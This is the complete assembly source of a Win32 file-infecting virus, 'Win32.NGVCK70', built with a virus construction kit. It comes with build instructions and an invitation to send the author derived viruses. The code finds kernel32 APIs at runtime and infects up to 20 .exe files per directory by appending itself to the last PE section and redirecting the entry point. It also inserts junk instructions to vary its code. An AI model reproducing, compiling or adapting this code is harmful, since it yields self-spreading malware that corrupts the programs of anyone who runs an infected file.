              
;
;
; Win32.NGVCK70 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK70
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 20
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 27098 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
 sub ecx, offset Delta
                                        ; mov ebp, ecx
                                        ; clear ebp
 and ebp, 0
 add ebp, ecx
 jmp KernelSearchStart
 sal ecx, 24d                           ; Trash


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop ebx
                                        ; retrieve PE - Header
 mov esi, [ebx+3Ch]
 add esi, ebx
                                        ; get File Alignment
 mov eax, [esi+3Ch]
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 sub dword ptr [ebp+Trash1], edx        ; Trash
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 xor dword ptr [ebp+Trash1], 137102     ; Trash
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, ecx
                                        ; get last section
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [esi+06h]
 sub edx, 1
 imul edx, edx, 28h
 add ecx, edx
                                        ; add ecx, 120
 inc ecx
 add ecx, 119d
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add ecx, eax
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 push ebx
 pop dword ptr [ebp+OldEIP]
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], -1
 or ebx, 52227558d                      ; Trash
 and dword ptr [ebp+OldBase], edx
 mov ebx, [ecx+10h]
 sal eax, 7d                            ; Trash
                                        ; mov eax, ebx
 mov eax, ebx
 add ebx, [ecx+14h]
 push ebx
 mov edx, eax
 add ecx, 0Ch
 add edx, [ecx]
 sub ecx, 0Ch
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], edx
                                        ; clear edx
 sub edx, edx

 add edx, [ecx+10h]
 push edx
                                        ; calculate new section size
 add edx, VirusSize
 push edx
 pop dword ptr [ebp+AlignReg1]
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], edx
 pop edx
 add edx,  (VirusSize-602d)
 add edx, 602d
 mov dword ptr [ecx+08h], 0
 and dword ptr [ebp+Trash1], ecx        ; Trash
 add dword ptr [ecx+08h], edx
 mov edx, dword ptr [ecx+10h]
 add edx, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov esi, offset Virus
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ecx
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 push 0
 pop edx
 mov ebx, dword ptr [ebp+AlignReg2]
 or ecx, 14382963d                      ; Trash
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], eax

 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
 push ebx
                                        ; round to pages
 shr ebx, 16d
 ror ebx, 16d
                                        ; add ebx, 1
 sub ebx, -1d
GetKernelLoop:
                                        ; clear ecx
 mov ecx, -64561d
 add ecx, 64561d
 sub ebx, 1
 mov cx, word ptr [ebx+03ch]
 test cx,0f800h
 jnz GetKernelLoop
 cmp ebx, dword ptr [ebx+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], ebx
                                        ; add ebx, 60
 add ebx, 60d
 mov eax, [ebx]
 add ebx, -60d
 add eax, ebx
 sub edx, ebx                           ; Trash
 mov [KernelPE+ebp], eax

 lea edx, GetApis
 add edx, ebp

 push edx
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
 rcl ecx, 5d                            ; Trash


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 mov ebx, offset filemask
 add ebx, ebp

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear ecx
 mov ecx, 60383d
 sub ecx, 60383d
 xor ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea edi, [ebp+WFD_szFileName]
 xchg ecx, edi

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 and edx, ebx                           ; Trash
 lea ebx, [ebp+WFD_szFileName]


 dec eax                                ; Trash
 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear esi
 mov esi, 0
 add esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
                                        ; mov edx, 19470
 push 19470d
 pop edx
 cmp edx, 19470d
 je Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [esi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, esi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; clear ebx
 push 0
 pop ebx
 sub ebx, 1
 add ebx, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [edx+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+Attributes]
 push eax
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 KernelMZ    dd 0h
 FileHandle  dd 0h
 Attributes  dd 0h
 Trash2      dd 0h
 AlignReg2   dd 0h
 InfCounter  dd 0h
 OldBase     dd 400000h
 Trash1      dd 0h
 OTableVA    dd 0h
 AlignTemp   dd 0h
 db 'Win32.NGVCK70 of SnakeByte',0
 counter     dw 0h
 OldEIP      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableVA    dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XSetFileAttributesA    dd 0h

 FindHandle  dd 0h
 MapAddress  dd 0h

 APINames:
 db 13d, 'FindNextFileA'
 db 13d, 'MapViewOfFile'
 db 15d, 'UnmapViewOfFile'
 db 09d, 'FindClose'
 db 18d, 'GetFileAttributesA'
 db 18d, 'CreateFileMappingA'
 db 11d, 'CloseHandle'
 db 14d, 'FindFirstFileA'
 db 11d, 'CreateFileA'
 db 18d, 'SetFileAttributesA'

 KernelPE    dd 0h
 TempApisearch2 dd 0h
 NewEIP      dd 0h
 NewSize     dd 0h
 filemask    db '*.eXE',0
 AlignReg1   dd 0h
 MapHandle   dd 0h
 ATableVA    dd 0h
 TempApisearch3 dd 0h
 TempAPI     dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx

                                        ; mov edx, -1
 mov edx, ( -1d xor 14d )
 xor edx, 14d
 and edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XCreateFileA]
 shl ebx, 21d                           ; Trash

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
                                        ; mov ebx, 4
 mov ebx, 4d
 push ebx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop edx
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 push eax
 ror ecx, 24d                           ; Trash
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 mov dword ptr [ebp+Trash1], 1328165    ; Trash
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; mov eax, -1
 mov eax, ( -1d - 36d )
 add eax, 36d
 and eax, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 and word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push eax
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; mov eax, ecx
                                        ; clear eax
 push 0
 pop eax
 add eax, ecx
                                        ; mov esi, ecx
 push ecx
 pop esi
 push edx
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [ebx]
 cmp ch, byte ptr [esi]
 jne ApiNotFound
 sub edx, 1
 or edx, edx
 jz FoundApi1
                                        ; add esi, 1
 add esi, 1d
                                        ; add ebx, 1
 sub ebx, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edx
 pop eax
 mov esi, dword ptr [ebp+TempApisearch2]
                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+TempApisearch3]
                                        ; add eax, 4
 dec eax
 add eax, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 mov ecx, eax
 movzx eax, word ptr [ecx]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear eax
 mov eax, -2048d
 add eax, 2048d
 add eax, NumberOfApis
 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edx, [ebx+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov ebx, dword ptr [edx]
                                        ; add edx, 4
 add edx, 4d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; get NTableVA
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
                                        ; add edx, 4
 add edx, 4d
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; load API Names and Offsets
 lea esi, [ebp+APIOffsets]

 mov ebx, ebp
 add ebx, offset APINames


GetApisLoop: 

                                        ; clear edx
 mov edx, 1704d
 sub edx, 1704d
 mov dl, byte ptr [ebx]
                                        ; add ebx, 1
 add ebx, 1d

                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; ebx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 add ebx, edx
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], ecx
                                        ; add esi, 4
 inc esi
 add dword ptr [ebp+Trash1], eax        ; Trash
 add esi, 3d
 sub dword ptr [ebp+Trash1], 1040689    ; Trash
 dec eax
 jnz GetApisLoop
 lea edi, [ebp+Outbreak]
 xchg eax, edi

 push eax
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d xor 33d )
 xor ebx, 33d
 lea esi, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [esi], 0h
 shl edx, 10d                           ; Trash
                                        ; add esi, 1
 add esi, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edi, edx

 push edi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edi, offset WIN32_FIND_DATA
 inc edx                                ; Trash
 add edi, ebp

 push edi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

